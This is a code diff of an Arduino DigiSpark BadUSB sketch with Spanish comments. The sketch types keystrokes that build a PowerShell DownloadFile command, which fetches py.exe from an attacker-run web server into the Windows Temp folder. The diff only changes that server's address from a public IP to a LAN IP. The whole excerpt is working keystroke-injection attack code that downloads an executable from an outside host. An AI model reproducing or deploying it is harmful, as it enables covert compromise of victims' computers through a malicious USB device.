@@ -43,7 +43,7 @@ void loop() {
   // Obviamente que tenemos que tener un apache levantado en esa ip y publicado el py.exe
   // Lo descargará en el Temp de Windows
   // Esto es lo que escriben las siguientes lineas:
-  //    $client.DownloadFile(http://159.234.148.251/py.exe,C:\windows\Temp\py.exe)
+  //    $client.DownloadFile(http://192.168.1.43/py.exe,C:\windows\Temp\py.exe)
   DigiKeyboard.sendKeyStroke(KEY_4, MOD_SHIFT_LEFT);
   DigiKeyboard.print("client.DownloadFile");
   DigiKeyboard.sendKeyStroke(KEY_8, MOD_SHIFT_LEFT);
@@ -52,7 +52,7 @@ void loop() {
   DigiKeyboard.sendKeyStroke(KEY_DOT, MOD_SHIFT_LEFT);
   DigiKeyboard.sendKeyStroke(KEY_7, MOD_SHIFT_LEFT);
   DigiKeyboard.sendKeyStroke(KEY_7, MOD_SHIFT_LEFT);
-  DigiKeyboard.print("159.234.148.251");
+  DigiKeyboard.print("192.168.1.43");
   DigiKeyboard.sendKeyStroke(KEY_7, MOD_SHIFT_LEFT);
   DigiKeyboard.print("py.exe");
   DigiKeyboard.sendKeyStroke(KEY_2, MOD_SHIFT_LEFT);
